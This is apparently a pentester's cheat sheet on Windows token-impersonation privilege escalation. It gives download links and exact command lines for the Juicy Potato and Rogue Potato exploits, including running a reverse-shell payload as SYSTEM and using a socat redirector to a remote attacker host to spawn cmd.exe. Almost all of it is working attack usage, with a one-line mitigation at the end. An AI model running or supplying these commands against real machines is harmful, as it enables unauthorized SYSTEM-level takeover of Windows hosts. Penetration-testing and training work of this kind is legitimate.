# Token Impersonation 


## Juicy potato

### First download .exe
[juicy potato](https://github.com/ohpe/juicy-potato)

### Second get clsid
[CLISID](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

### execute 


```
jp.exe -t * -p agent.exe -l 9001
.\jp.exe -t * -p file.bat -l 9001 -c "CLSID" 9001
-p # reverse shell we got in with or a script to run 
-c # clsid
-l # wanted port
```
## Rouge Potato

**Must have SEimpersonate priv**

[Rouge Potato](https://github.com/antonioCoco/RoguePotato)

```
Examples:
 - Network redirector / port forwarder to run on your remote machine, must use port 135 as src port
        socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999
 - RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. Use this if you have fw restrictions.
        RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
 - RoguePotato all in one with RogueOxidResolver running locally on port 9999
        RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
 - RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename
        RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
        
```

### Mitigation

**Upgrade to Win10 >=1809,
Windows Server 2019!**